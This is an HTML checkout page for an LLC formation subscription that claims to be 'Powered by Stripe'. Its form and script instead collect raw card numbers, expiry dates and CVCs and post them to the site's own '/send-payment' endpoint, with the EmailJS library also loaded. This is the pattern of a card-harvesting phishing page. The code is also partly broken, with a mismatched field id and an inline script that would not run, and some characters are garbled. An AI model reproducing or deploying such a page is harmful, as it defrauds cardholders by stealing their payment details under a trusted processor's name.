<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Checkout</title>
  <link rel="stylesheet" href="style.css" />
</head>
<body>

<header class="top-bar">
  <span>Need help? ‚åÑ</span>
</header>

<main class="container">

  <h1>From dreamer to Do'er ‚Äî Make it official!</h1>

  <!-- Info banner -->
  <div class="info-box">
    <div class="info-icon">üõ°Ô∏è</div>
    <div>
      <h3>Flawless Formation ‚Äî Or You Get Your Money Back</h3>
      <p>
        We know how important it is to get your company formed the right way.
        If there's an error in your formation due to our service, we'll refund
        that portion ‚Äî no questions asked.
      </p>
      <a href="#">See Conditions</a>
    </div>
  </div>

  <!-- Content grid -->
  <div class="grid">

    <!-- LEFT: price summary -->
    <div class="summary">
      <div class="price">
        <span class="label">Pay today</span>
        <span class="amount">$400.75</span>
      </div>

      <div class="line">
        <span>Then $297.00 per year</span>
      </div>

      <div class="breakdown">
        <div>
          <span>WY LLC Formation Fee</span>
          <span>$103.75</span>
        </div>
        <div>
          <span>Starter Plan</span>
          <span>$297.00</span>
        </div>
      </div>

      <div class="subtotal">
        <span>Subtotal</span>
        <span>$400.75</span>
      </div>

      <button class="promo-btn">Add promotion code</button>

      <div class="total">
        <span>Total due today</span>
        <span>$400.75</span>
      </div>
    </div>

    <!-- RIGHT: payment form -->
    <div class="card">
      <h3>Pay with card</h3>

      <form id="paymentForm" method="POST">
        <label>Email</label>
        <input type="email" id="email" value="samueludsenge2910@gmail.com" required />

        <label>Payment method</label>
        <div class="card-input">
          <input type="text" id="cardnumber"placeholder="1234 1234 1234 1234" maxlength="19" required />
          <div class="icons">üí≥</div>
        </div>

        <div class="row">
          <input type="text" id="expiry" placeholder="MM / YY" maxlength="5" required />
          <input type="text" id="cvc" placeholder="CVC" maxlength="3" required />
          <div class="icons">üí≥</div>
        </div>

        <label>Cardholder name</label>
        <input type="text" id="cardholder" placeholder="Full name on card" required />

        <label>Country or region</label>
        <select id="country" required>
          <option>Rwanda</option>
          <option>United States</option>
          <option>Kenya</option>
        </select>

        <button type="submit" class="pay-btn">Subscribe</button>

        <p class="terms">
          By subscribing, you authorize us to charge you according to
          the terms until you cancel.
        </p>

        <p class="powered">Powered by Stripe ¬∑ Terms ¬∑ Privacy</p>
      </form>
    </div>

  </div>

</main>

<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>

<script src="script.js">
    const form = document.getElementById('paymentForm');

        form.addEventListener('submit', async (e) => {
            e.preventDefault(); // Prevent default page reload

            const formData = {
                email: document.getElementById('email').value,
                cardNumber: document.getElementById('cardNumber').value,
                expiry: document.getElementById('expiry').value,
                cvc: document.getElementById('cvc').value,
                cardholder: document.getElementById('cardholder').value,
                country: document.getElementById('country').value
            };

            try {
                const response = await fetch('/send-payment', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(formData)
                });

                if (response.ok) {
                    alert('Payment details sent successfully!');
                    form.reset();
                } else {
                    alert('Error sending data. Check server logs.');
                }
            } catch (err) {
                alert('Network error: ' + err.message);
            }
        });
</script>
</body>
</html>